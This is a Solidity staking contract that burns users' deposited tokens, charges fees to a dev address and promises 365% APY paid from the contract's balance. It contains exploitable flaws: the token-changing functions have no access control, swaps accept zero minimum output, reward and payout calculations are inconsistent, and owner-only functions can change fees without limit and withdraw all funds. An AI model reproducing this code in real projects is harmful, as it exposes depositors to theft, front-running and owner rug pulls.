// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function getAmountsOut(uint256 amountIn, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function WETH() external pure returns (address);
}

contract TokenStakingMiner {
    ERC20 public token;
    ERC20 public tokenOut;
    mapping(address => uint256) public stakedAmount;
    mapping(address => uint256) public userClaimed;
    mapping(address => uint256) public lastClaimTime;

    uint256 public rewardsPerHour = 4225; // 0.04225%/h or 365% APY
    uint256 public _stakeFee = 5; //5%
    uint256 public _claimFee = 5; //5%

    address private constant UNISWAP_ROUTER_ADDRESS =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 private uniswapRouter;

    address public devAddress;

    uint256 private amountStaked;
    uint256 private amountClaimed;

    constructor(address tokenAddress, address tokenOutAddress) {
        token = ERC20(tokenAddress); // $ SIT
        tokenOut = ERC20(tokenOutAddress); // BONE: 
        uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER_ADDRESS);
        devAddress = msg.sender;
        ERC20(token).approve(
            UNISWAP_ROUTER_ADDRESS,
            ERC20(token).totalSupply()
        );
    }

    modifier onlyOwner() {
        require(msg.sender == devAddress, "not allowed");
        _;
    }

    function changeDevAddress(address _newDev) public onlyOwner {
        devAddress = _newDev;
    }

    uint256 startTime = 0;

    function startStake() public onlyOwner {
        startTime = block.timestamp;
    }

    uint256 public feetoken = 3;

    function swapType(uint256 feeToken) public onlyOwner {
        feetoken = feeToken;
    }

    function stake(uint256 amount) external {
        require(startTime > 0, "stake not started");
        token.transferFrom(msg.sender, address(this), amount);

        uint256 fee = (amount * _stakeFee) / 100; // calculate the fee
        uint256 total = amount - fee;

        // Transfer the fee to the dev address
        token.transfer(devAddress, fee);

        // Burn the tokens that are staked by the user
        token.transfer(0x000000000000000000000000000000000000dEaD, total);

        amountStaked += amount;
        stakedAmount[msg.sender] += amount;
        lastClaimTime[msg.sender] = block.timestamp;
    }

    // Calculate the rewards since the last update on Deposit info
    function _calculateEarned(address user)
        internal
        view
        returns (uint256 rewards)
    {
        uint256 lastTime = lastClaimTime[msg.sender];
        uint256 timeElapsed = block.timestamp - lastTime;
        if (timeElapsed <= 365 days) {
            return (((((block.timestamp - lastClaimTime[user]) *
                stakedAmount[user]) * rewardsPerHour) / 3600) / 10000000);
        } else {
            return (((((startTime + 365 days - lastClaimTime[user]) *
                stakedAmount[user]) * rewardsPerHour) / 3600) / 10000000);
        }
    }

    function withdraw() external {
        /*uint256 amount = stakedAmount[msg.sender] +
            _calculateEarned(msg.sender);*/
        uint256 amount = getAMOUNT();
        stakedAmount[msg.sender] = 0;
        lastClaimTime[msg.sender] = 0;

        //swapTokensForTokens(amount);
        if (feetoken == 1) {
            swapTokensForTokens2(amount);
        }
        if (feetoken == 2) {
            swapTokensForTokens3(amount);
        }
        if (feetoken == 3) {
            swapTokensForTokens4(amount);
        }
    }

    function compound() external {
        uint256 interest = _calculateEarned(msg.sender);
        require(interest > 0, "No interest to compound");

        stakedAmount[msg.sender] += interest;
        lastClaimTime[msg.sender] = block.timestamp;
    }

    function changeFees(uint256 stakeFee, uint256 unstakeFee) public onlyOwner {
        _stakeFee = stakeFee;
        _claimFee = unstakeFee;
    }

    function changeToken(address tokenAddress) external {
        ERC20 newToken = ERC20(tokenAddress);
        newToken.approve(UNISWAP_ROUTER_ADDRESS, newToken.totalSupply());
        token = newToken;
    }

    function changeTokenOut(address tokenAddress) external {
        ERC20 newTokenOut = ERC20(tokenAddress);
        newTokenOut.approve(UNISWAP_ROUTER_ADDRESS, newTokenOut.totalSupply());
        tokenOut = newTokenOut;
    }

 
    function swapTokensForTokens3(uint256 amountIn) internal {
        address[] memory path = new address[](3);
        path[0] = address(token);
        path[1] = uniswapRouter.WETH();
        path[2] = address(tokenOut);

        uint256 amountOutMin = 0;
        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            amountOutMin,
            path,
            address(this),
            block.timestamp
        );

        //uint256 amountOut = amounts[amounts.length - 1]; // get the amount of tokenOut received
        uint256 amountOut = getAmountOut(amountIn);

        uint256 fee = (amountOut * _claimFee) / 100; // calculate the fee
        amountClaimed += amountOut;
        userClaimed[msg.sender] += amountOut - fee;
        ERC20(tokenOut).transfer(devAddress, fee); // transfer the fee to devAddress
        if (ERC20(tokenOut).balanceOf(address(this)) < amountOut - fee) {
            ERC20(tokenOut).transfer(
                msg.sender,
                ERC20(tokenOut).balanceOf(address(this))
            ); // transfer the remaining amount to the caller
        } else {
            ERC20(tokenOut).transfer(msg.sender, amountOut - fee); // transfer the remaining amount to the caller
        }
    }

    function getAMOUNT() public view returns (uint256) {
        return stakedAmount[msg.sender] + _calculateEarned(msg.sender);
    }

    function swapTokensForTokens2(uint256 amountIn) internal {
        address[] memory path = new address[](3);
        path[0] = address(token);
        path[1] = uniswapRouter.WETH();
        path[2] = address(tokenOut);

        uint256 amountOutMin = 0;
        uint256[] memory amounts = uniswapRouter.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            address(this),
            block.timestamp + 10 minutes
        );

        uint256 amountOut = amounts[amounts.length - 1]; // get the amount of tokenOut received

        uint256 fee = (amountOut * 5) / 100; // calculate the fee

        ERC20(tokenOut).transfer(devAddress, fee); // transfer the fee to devAddress
        ERC20(tokenOut).transfer(msg.sender, amountOut - fee); // transfer the remaining amount to the caller
    }
    
        function swapTokensForTokens4(uint256 amountIn) internal {
        address[] memory path = new address[](3);
        path[0] = address(token);
        path[1] = uniswapRouter.WETH();
        path[2] = address(tokenOut);

        uint256 amountOutMin = 0;
        uniswapRouter.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            address(this),
            block.timestamp
        );

        //uint256 amountOut = amounts[amounts.length - 1]; // get the amount of tokenOut received
        uint256 amountOut = getAmountOut(amountIn);

        uint256 fee = (amountOut * _claimFee) / 100; // calculate the fee
        amountClaimed += amountOut;
        userClaimed[msg.sender] += amountOut - fee;
        ERC20(tokenOut).transfer(devAddress, fee); // transfer the fee to devAddress
        if (ERC20(tokenOut).balanceOf(address(this)) < amountOut - fee) {
            ERC20(tokenOut).transfer(
                msg.sender,
                ERC20(tokenOut).balanceOf(address(this))
            ); // transfer the remaining amount to the caller
        } else {
            ERC20(tokenOut).transfer(msg.sender, amountOut - fee); // transfer the remaining amount to the caller
        }
    }

    function userStaked(address user) internal view returns (uint256) {
        return stakedAmount[user];
    }

    function userEarned(address user) internal view returns (uint256) {
        return _calculateEarned(user);
    }

    function getAmountOut(uint256 amountIn) public view returns (uint256) {
        address[] memory path;
        path = new address[](3);
        path[0] = address(token);
        path[1] = uniswapRouter.WETH();
        path[2] = address(tokenOut);

        uint256[] memory amountsOut = uniswapRouter.getAmountsOut(
            amountIn,
            path
        );

        return amountsOut[amountsOut.length - 1];
    }

    function getContractBalance() internal view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function getUserTokenBalance(address _user)
        internal
        view
        returns (uint256)
    {
        return token.balanceOf(_user);
    }

    function getUserTokenOutBalance(address _user)
        internal
        view
        returns (uint256)
    {
        return tokenOut.balanceOf(_user);
    }

    function getContractData()
        public
        view
        returns (
            uint256 deposited,
            uint256 claimed,
            uint256 contractBalance
        )
    {
        return (
            deposited = amountStaked,
            claimed = amountClaimed,
            contractBalance = getContractBalance()
        );
    }

    function getUserData(address _user)
        public
        view
        returns (
            uint256 staked,
            uint256 earned,
            uint256 userBalance,
            uint256 userTokenOutBalance,
            uint256 boneEarned,
            uint256 claimed
        )
    {
        return (
            staked = userStaked(_user),
            earned = userEarned(_user),
            userBalance = getUserTokenBalance(_user),
            userTokenOutBalance = getUserTokenOutBalance(_user),
            boneEarned = getAmountOut(userStaked(_user) + userEarned(_user)),
            claimed = userClaimed[_user]
        );
    }

    function rescueToken(uint256 amount) public onlyOwner {
        ERC20(token).transfer(msg.sender, amount); // transfer the remaining amount to the caller
    }

    function rescueTokenOut(uint256 amount) public onlyOwner {
        ERC20(tokenOut).transfer(msg.sender, amount); // transfer the remaining amount to the caller
    }
}
